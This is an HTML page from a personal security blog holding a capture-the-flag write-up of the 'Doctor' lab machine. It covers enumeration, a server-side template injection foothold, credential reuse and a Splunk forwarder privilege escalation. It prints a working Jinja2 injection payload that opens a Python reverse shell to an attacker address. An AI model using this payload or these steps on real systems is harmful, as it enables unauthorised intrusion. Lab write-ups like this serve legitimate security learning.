@@ -1,0 +1,98 @@
+
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Doctor - My Cyberjourney</title>
+        <link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
+        <link rel="preconnect" href="https://fonts.googleapis.com">
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link href="Doctor.css" rel="stylesheet">
+        <link href="https://fonts.googleapis.com/css2?family=Alumni+Sans+Pinstripe:ital@0;1&display=swap" rel="stylesheet">
+        <link href="https://fonts.googleapis.com/css2?family=Roboto+Serif:ital,opsz,wght@0,8..144,100..900;1,8..144,100..900&display=swap" rel="stylesheet">
+    </head>
+    <body>
+        <!-- Menú -->
+        <nav class="w3-bar">
+            <div class="logo">
+                <p>My Cyberjourney</p>
+            </div>
+            <div class="w3-bar-item w3-right w3-hide-large w3-hover-opacity" onclick="w3_open()">
+                <i class="fa fa-bars w3-xlarge"></i>
+            </div>
+            <div class="w3-hide-small">
+                <ul class="elementos-menu">
+                    <li class="w3-bar-item"><a href="index.html">Home</a></li>
+                    <li class="w3-bar-item"><a href="curriculum/curriculum.html">Resume (CV)</a></li>
+                    <li class="w3-bar-item"><a href="writeups/writeups.html">Writeups</a></li>
+                    <li class="w3-bar-item"><a href="learning/learning.html">Learning Journey</a></li>
+                </ul>
+            </div>
+        </nav> 
+        <div class="content">
+            <h1 class="title">EASY-DOCTOR</h1>
+<h1><strong>1. Recon</strong></h1>
+<h2>Nmap</h2>
+<p><code>nmap</code> finds three open ports: SSH (22), HTTP (80) and an unknown service which is running in the default Splunk management port (8089) </p>
+<p><img alt="imagen.png" src="imagen.png" /></p>
+<p>The NSE (Nmap Scripting Engine) finds the following information:</p>
+<ul>
+<li>The box is using Ubuntu</li>
+<li>The version of the SSH service is 8.2p1</li>
+<li>The port 80 HTTP server is using Apache 2.4.4, Werkzeug 1.0.1 (a Web Server Gateway Inferface) and Python 3.8.2</li>
+<li>The unknown service is a HTTP service for Splunk</li>
+</ul>
+<p><img alt="imagen.png" src="imagen%201.png" /></p>
+<hr />
+<h2>Splunkd - TCP 8089</h2>
+<p>Visiting <code>https://10.10.10.209:8089</code> shows a website with some links but they either require authentication or do nothing. Having tried some common user and password combinations without any success I will go on exploring the HTTP port.</p>
+<p><img alt="imagen.png" src="imagen%202.png" /></p>
+<hr />
+<h2>Website - TCP 80</h2>
+<p>The site is for a doctor company. A domain (<code>doctors.htb</code>) is shown in the ‘contact us’ section. After adding it to <code>/etc/hosts</code> I will run <code>gobuster</code> to try brute forcing subdomains, but no results are found. I will also try running a DNS zone transfer with <code>dig</code> but, once again, no results are obtained.</p>
+<p><img alt="imagen.png" src="imagen%203.png" /></p>
+<p>The links in the top lead to some different pages so I will run <code>gobuster</code> again but this time I will try finding hidden directories and files instead of subdomains. All the results are related to the website and there is nothing that seems vulnerable there.</p>
+<p><img alt="imagen.png" src="imagen%204.png" /></p>
+<p>Running gobuster with <code>http://doctors.htb</code> shows some different results though. All the directories found are probably related to the login function as following them either doesn’t show anything or redirects to <code>/login</code>.</p>
+<p><img alt="imagen.png" src="imagen%205.png" /></p>
+<p><a href="http://doctors.htb/login"><code>http://doctors.htb/login</code></a> leads to a login form where an email is needed.</p>
+<p><img alt="imagen.png" src="imagen%206.png" /></p>
+<p>The <code>Forgot Password?</code> link contains a password recovery page that shows wether an email exists or not. Using <code>cewl</code> in <code>http://10.10.10.209/</code> a single email is retrieved. Neither that email or any other email containing the names of the doctors shown in the website exists. </p>
+<p><img alt="imagen.png" src="imagen%207.png" /></p>
+<p><img alt="imagen.png" src="imagen%208.png" /></p>
+<p>As no accounts have been found, I will create one following the <code>Sign Up Now</code> link. It seems that accounts are deleted after twenty minutes.</p>
+<p><img alt="imagen.png" src="imagen%209.png" /></p>
+<hr />
+<h1><strong>2. Gaining Access</strong></h1>
+<p>Now that I’m logged in, I can post new messages or edit my account. After doing some testing, I have found that posting a message creates a XML entry in <code>/archive</code>. </p>
+<p><img alt="imagen.png" src="imagen%2010.png" /></p>
+<p><img alt="imagen.png" src="imagen%2011.png" /></p>
+<p><img alt="imagen.png" src="imagen%2012.png" /></p>
+<p>Doing some research, I have come across this post <a href="https://www.notion.so/SIEM-Visualization-Example-1-Failed-Logon-Attempts-All-Users-10af78927a8c435484d88071b86e632c?pvs=21">Payload All The Things</a> which talks about <strong><code>Server Side Template Injections</code>.</strong> The post explains that a good way to test if an application is vulnerable to this attack is writing <code>${{&lt;%[%'"}}%\.</code> so the website shows an error. Posting a message with that title will lead to <code>/archive</code> showing an error. This could possibly lead to a Remote Code Execution through this kind of injections. </p>
+<p><img alt="imagen.png" src="imagen%2013.png" /></p>
+<p>To identify which template is being used I will follow this image I have found in <a href="https://portswigger.net/web-security/server-side-template-injection">PortSwigger</a>. Following the path wasn’t very useful as it led to ‘unknown’ though.</p>
+<p><img alt="imagen.png" src="imagen%2014.png" /></p>
+<p><img alt="imagen.png" src="imagen%2015.png" /></p>
+<p>Using a payload I found <a href="https://github.com/payloadbox/ssti-payloads">here</a> I managed to get a reverse shell and get access to the system.</p>
+<p><code>{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"10.10.14.6\",443)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/bash\", \"-i\"]);'").read().zfill(417)}}{%endif%}{% endfor %shaun}</code></p>
+<p><img alt="imagen.png" src="imagen%2016.png" /></p>
+<p><img alt="imagen.png" src="imagen%2017.png" /></p>
+<hr />
+<h1><strong>3. Privilege Escalation</strong></h1>
+<h2>Shaun</h2>
+<p>Using <code>id</code> to check which groups does the user <code>web</code> belong to, I have found that it is part of <code>adm(4)</code>. This group has access to <code>/var/logs</code> so I will check if there are any plain text passwords in the logs.</p>
+<p><img alt="imagen.png" src="imagen%2018.png" /></p>
+<p>One of the lines in <code>/apache2/backup</code> shows the string <code>Guitar123</code> as the email used to reset its password. That is weird so let’s check if that is the password for <code>shaun</code>. It works so now I have access to <code>user.txt</code> </p>
+<p><img alt="imagen.png" src="imagen%2019.png" /></p>
+<hr />
+<h2>Root</h2>
+<p>After running some commands as <code>shaun</code> and looking for something inside the system that could let me escalate privileges to gain access as root, I have remembered that port 8089 had a login form. Using <code>shaun:Guitar123</code> as the credentials I have logged in and now there are way more links than before.</p>
+<p><img alt="imagen.png" src="imagen%2020.png" /></p>
+<p>Before visiting them one by a one I have looked for Splunk 8089 exploits and I have come across <a href="https://github.com/cnotin/SplunkWhisperer2">this one</a>. After reading <a href="https://airman604.medium.com/splunk-universal-forwarder-hijacking-5899c3e0e6b2">this explanation</a> of what the script does adn why it works, I have used it and succesfully sent a reverse shell running as root to my kali. Now I can retrieve the root flag and submit it.</p>
+<p><img alt="imagen.png" src="imagen%2021.png" /></p>
+<p><img alt="imagen.png" src="imagen%2022.png" /></p>
+<hr />
+        </div>
+    </body>
+</html>
